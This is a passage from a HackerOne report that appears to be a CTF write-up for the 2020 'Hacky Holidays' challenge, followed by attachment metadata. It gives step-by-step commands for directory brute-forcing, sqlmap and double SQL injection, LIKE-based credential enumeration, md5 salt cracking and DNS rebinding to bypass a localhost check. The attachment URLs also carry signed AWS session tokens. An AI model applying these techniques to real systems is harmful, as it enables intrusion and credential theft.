endpoint and trying\n to bruteforce further it became evident that only an app can access them.\n\nIt's not possible to forge an auth token ourselves, it's not possible to get at least an image direct\nly, that's why I thought on how we could make the app forge the path for us. That's when I decided to\n fuzz the sql injection again, and as a result I discovered a second sql injection, an internal one,\nthat changed the path and if done right signed with auth token. In that way we could do a path traver\nsal attack.\n\nThanks to a path traversal and auth forging, we were able to bruteforce an api endpoint and find a fe\nw of them, where one was really interesting - `user`, brute forcing parameters gave us `username` and\n `password`. After that I fuzzed them, and found that they act like a `LIKE` operator and by submitin\ng `%` we match any character, any substring of any length, so that we can brute force and get a usern\name and password.\n\nThe username and password should be used on `/attack-box` endpoint.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/\n  * Start bruteforcing directories (you'll find api endpoint)\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n  * Find SQL Injection in `hash` parameter https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k\n  * Start the sqlmap \n\n```\nsudo sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'\n```\n\n  * Notice that this endpoint accesses \n  * After enumerating, fuzzing and assuming that this was a subquery it was possible to inject the second injection. \n  * Download a script that fuzzes API endpoints and parameters - {F1140133}\n  * launch API endpoint brute-force \n\n```\npython3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --postfix ?s=1 -s 404\n```\n    \n{F1140120}\n  * launch parameter brute-force\n\n```\npython3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --prefix user? --postfix =1 -s 404,400\n```\n    \n{F1140121}   \n  * download {F1140136} and launch username enumeration (launch for each character) result - `grinchadmin` \n\n```\npython3 double_sql.py -w characters.txt -s 400 --prefix user?username=g --postfix % -s 204\npython3 double_sql.py -w characters.txt -s 400 --prefix user?username=grinch --postfix % -s 204\n```\n\n  * launch password enumeration (launch for each character) result - `s4nt4sucks`\n\n```\npython3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin\u0026password=' --postfix % -s 204\npython3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin\u0026password=s4nt' --postfix % -s 204\n```\n  \n{F1140122}\n  * Navigate to hackyholidays.h1ctf.com/attack-box/ and use credentials `grinchadmin` and `s4nt4sucks` to sign in   \n{F1140123}\n  * Take the flag\n### Supporting Material/References:\n\n### Key takeaways\nAlways fuzz\n\n## 12. Insecure cryptographic salt usage. Predictive algorithm used. DNS Rebinding attack\nAttack box, the last app, that we had to crack. After logging in with the credentials we found before\n, we explored the functionality and I saw that Mr Grinch was doing a DDoS attack on a couple IPs. Our\n mission was to take him down, so what we needed is to change the IP to his.\n\nThe `launch` endpoint had a `payload` parameter with a base64 encoded value containing target argumen\nt (IP) and a hash, a sign that checked whether the payload was forged or not.\n\nFirstly we had to forge our payloads, and I decided to check different hash algorithms like `md5(salt + pass)`, `md5(pass + salt)` or even `md5(mdt(pass)+salt)`. The script found that the salt was `mrgr\ninch463`. From now on, we could supply any IP to the attack box.\n\nI couldn't find Mr Grinch IP addresses, but thought that we could take out attack boxes by DDoSing `127.0.0.1`, but there is a check that stops an attack on the localhost. Sending different payloads, li\nke an integer representation of an IP, or cname won't work, because the check does a `dig` lookup for\n an ip, and checks whether it is an internal one.\n\nIn order to bypass that check I remembered about a DNS Rebinding attack, where the host changed the IP address after getting the first resolve (or by any other algorithm). There are a couple of services that helps us to do this type of attack, but I stopped on `https://lock.cmpxchg8b.com/rebinder.html`\n. For the attack I developed a script that would create links for us.\n\nUsing the hosts that I hard-coded in a script and their links it's possible to DDoS Grinch Networks.\nWe'll be redirected to the final page and get the last flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/attack-box\n  * Log in with username - `grinchadmin` and password - `s4nt4sucks`\n  * Intercept requests with Burp Suite. Click on `Attack` button and notice requests that are being done\n  * Notice a request to \n\n```\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==\n```\n\n  * payload parameter decodes into \n\n```\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n```\n\n{F1140124}\n  * Download the script {F1140135}\n  * Lauch the script with target and hash values as first and second arguments for the script and a wordlist as the third.\n\n```\npython3 hash_target.py 203.0.113.33 5f2940d65ca4140cc18d0878bc398955 ~/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt\n```\n\n{F1140125}\n  * To verify that  the salt is the same across different IPs, execute the command again with other values.\n\n```\necho eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ== | base64 -d\n```\n\n  * The salt is `mrgrinch463` and an algorithm for hash - md5(salt + data_to_hash)\n  * Localhost check bypass using DNS rebinding (You should try a couple times, as it may not work at first)\n  * Download ssrf.py {F1140134}\n  * Go to https://lock.cmpxchg8b.com/rebinder.html\n  * Set A to 8.8.8.810 and B to 127.0.0.1 . Copy the result (it should be `0808080a.7f000001.rbndr.us`)\n  * Execute ssrf.py script to get an attack links (I've hardcoded hosts you were looking into)\n\n```\npython3 ssrf.py mrgrinch463 \n```\n\n{F1140126}\n  * Navigate to the links that you got (e.g. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiAiMDgwODA4MGEuN2YwMDAwMDEucmJuZHIudXMiLCAiaGFzaCI6ICIyNTE5YTA1YzA3M2YxMmYxNzg3MTdkYTNlYjlhZDczMyJ9)    \n{F1140131}\n  * Once the attack works, you should be able to take down Grinch Networks - https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709\n\n{F1140127}\n\n### Key takeaways\nNever give up, as I though to give up thrice on this challenge.","automated_response":false,"created_at":"2020-12-31T19:39:25.955Z","updated_at":"2020-12-31T19:52:00.523Z","actor":{"username":"yso","cleared":false,"url":"/yso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1140070,"filename":"Screenshot_from_2020-12-31_20-40-41.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/htqy6m70ddvywwv0qx5ui4qiyn1x?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-40-41.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-40-41.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f17bad218379d2adfc2c01a4d576b3bc34f5dbc752e370c974bd728e4bd945c9"},{"id":1140071,"filename":"Screenshot_from_2020-12-28_18-07-59.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/thmp48ph86rwgfue9qcpfzp39iyo?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-28_18-07-59.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-28_18-07-59.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=20fd7e2a8ba15076b6326f2760f0665ef09ba55ea763c59d30a078696d9c84d5"},{"id":1140072,"filename":"Screenshot_from_2020-12-28_18-34-34.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b5atey6raonpxq228i2hwxssoodk?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-28_18-34-34.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-28_18-34-34.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=70bb1a93ef35ab2970433ba9b9b09fc84c713d4a2bbc445a21621b3dafaa42ad"},{"id":1140073,"filename":"Screenshot_from_2020-12-28_18-35-48.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ieswl4uevurleuof6h8m5ql5pp5h?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-28_18-35-48.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-28_18-35-48.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=55afc7205d0ff23f1447238f7f86f09cab2f64923d5a08a5d6b25078fdc1e1a1"},{"id":1140075,"filename":"Screenshot_from_2020-12-31_20-44-55.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xt1p4wb574f9cruv7yujutlg933h?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-44-55.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-44-55.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dcab962ee6a8be1a68e05cb00bbe77c7612912fefda309928a12c91111bf9f29"},{"id":1140076,"filename":"Screenshot_from_2020-12-31_20-45-43.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uytlz6jg1oi1i879rfagakg8hqyh?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-45-43.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-45-43.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=66781dcac08c8ae836c064ccff584ad972f0a2144af85cd855028fd1f963da7a"},{"id":1140077,"filename":"Screenshot_from_2020-12-31_20-46-00.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jximdl21hhgabu3k5jm6syjsk6yf?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-46-00.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-46-00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a35edb161e7bea676f43c74ab173754240e4abd8fd7f94eeee9e91be8b2a7d69"},{"id":1140084,"filename":"Screenshot_from_2020-12-31_20-51-01.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dfg70py5zylhxlsm5f10itghsop9?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_20-51-01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_20-51-01.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5M